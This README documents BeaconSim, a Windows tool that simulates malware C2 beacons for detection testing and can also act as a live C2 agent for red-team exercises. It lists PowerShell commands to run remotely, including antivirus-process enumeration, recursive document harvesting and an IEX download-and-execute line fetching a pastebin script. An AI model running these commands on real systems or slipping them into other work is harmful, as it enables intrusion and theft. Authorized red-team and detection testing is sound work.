# BeaconSim - C2 Beacon Simulator & Agent

![BeaconSim](https://img.shields.io/badge/Version-2.0-blue) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey) ![Framework](https://img.shields.io/badge/.NET-Framework%204.8%20%7C%20.NET%209.0-purple)

BeaconSim is a versatile cybersecurity tool that operates in two modes:
1. **Beacon Simulation Mode** - Simulate malware C2 communications for testing detection systems
2. **C2 Agent Mode** - Function as a real C2 agent for red team exercises and security research

Great for testing Threat Intelligence feeds, verifying detection logic in EDR and SIEMs, and conducting authorized security assessments!

## üöÄ Quick Start

### Simulation Mode (Original)
```powershell
.\BeaconSim.exe --config=targets.yaml --minInterval=30 --maxInterval=120 --loopCount=10
```
Remove the C2 settings from the Yaml if you want to use theoriginal targets.


### C2 Agent Mode (New)
```bash
.\BeaconSim.exe --c2
```

## üìñ Usage

```
BeaconSim - C2 Beacon Simulator & Agent
----------------------------------------
Usage:
  BeaconSim.exe [--config=path] [--loopCount=N] [--c2]

Options:
  --config=path        Path to YAML config file (default: targets.yaml)
  --loopCount=N        Number of beacon attempts (-1 = infinite)
  --c2                 Force C2 agent mode
  --help, -h           Show this help menu and exit

Modes:
  C2 Agent Mode:       Connects to C2 server and executes commands
  Simulation Mode:     Original beacon simulation (legacy)

Examples:
  BeaconSim.exe --c2                           # Run as C2 agent
  BeaconSim.exe --config=myconfig.yaml --c2   # Use custom config
```

## üåê Simulation Mode - Supported Protocols

You can specify one or more protocols per target in your `targets.yaml` config file. BeaconSim will simulate connection attempts using the selected protocols and ports.

| Protocol | Description | Notes |
|----------|-------------|--------|
| `ping` | ICMP echo request (simulated) | Uses DNS resolution to simulate |
| `http` | HTTP GET request | Port 80 by default |
| `https` | HTTPS GET request (SSL/TLS) | Port 443 by default |
| `dns` | DNS resolution via `Dns.GetHostAddressesAsync()` | Uses system resolver |
| `tcp` | Raw TCP socket connection | Requires port(s) to be defined |
| `ftp` | TCP connection on port 21 | Simulates basic connection only |
| `ssh` | TCP connection on port 22 | No authentication performed |
| `websocket` | WebSocket handshake (if implemented) | Fallbacks to HTTP(s) if needed |

### Simulation Configuration Example
```yaml
targets:
  - host: "8.8.8.8"
    protocols: ["ping", "tcp"]
    ports: [53]
  - host: "google.com"
    protocols: ["http", "tcp"]
    ports: [80, 443]
  - host: "github.com"
    protocols: ["http"]
```

## üéØ C2 Agent Mode - Remote Command Execution

When running with `--c2` flag, BeaconSim connects to a C2 server and can execute remote PowerShell commands.

### C2 Configuration Example
```yaml
# C2 Server Configuration
c2_server:
  url: "http://192.168.1.100:8080"
  agent_id: "agent_001"

# Beacon timing
intervals:
  min_interval: 30
  max_interval: 120
```

### Compatible C2 Server
BeaconSim C2 mode is designed to work with [SimpleC2Listener](https://github.com/acquiredsecurity/SimpleC2Listener).

## üíª Command Examples

Once connected to a C2 server, the following PowerShell commands can be executed remotely:

### System Information
```powershell
whoami
systeminfo
Get-ComputerInfo | Select-Object WindowsProductName, TotalPhysicalMemory
```

### Process Enumeration
```powershell
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
Get-Process | Where-Object {$_.ProcessName -match "defender|kaspersky|symantec"}
```

### Network Reconnaissance
```powershell
ipconfig /all
netstat -an | findstr LISTENING
Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4"}
```

### File System Access
```powershell
dir C:\Users
Get-ChildItem C:\ -Recurse -Include *.txt,*.doc -ErrorAction SilentlyContinue
```

### Remote Script Execution
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/SCRIPT_ID')
```

## üîß Configuration

### Full Configuration Example
```yaml
# C2 Server Configuration (for agent mode)
c2_server:
  url: "http://192.168.1.100:8080"
  agent_id: "agent_001"

# Beacon timing
intervals:
  min_interval: 30
  max_interval: 120

# Targets (for simulation mode)
targets:
  - host: "8.8.8.8"
    protocols: ["ping", "tcp"]
    ports: [53]
  - host: "google.com"
    protocols: ["http", "tcp"]
    ports: [80, 443]
  - host: "1.1.1.1"
    protocols: ["ping"]
  - host: "github.com"
    protocols: ["http"]

- **System access** - Can read files and execute system commands

### Simulation Mode
- **Network connections** - Creates actual network connections to target hosts
- **DNS queries** - Generates real DNS resolution requests
- **Detection testing** - Designed to trigger security monitoring systems

## üìã System Requirements

- **OS:** Windows 10/11, Windows Server 2016+
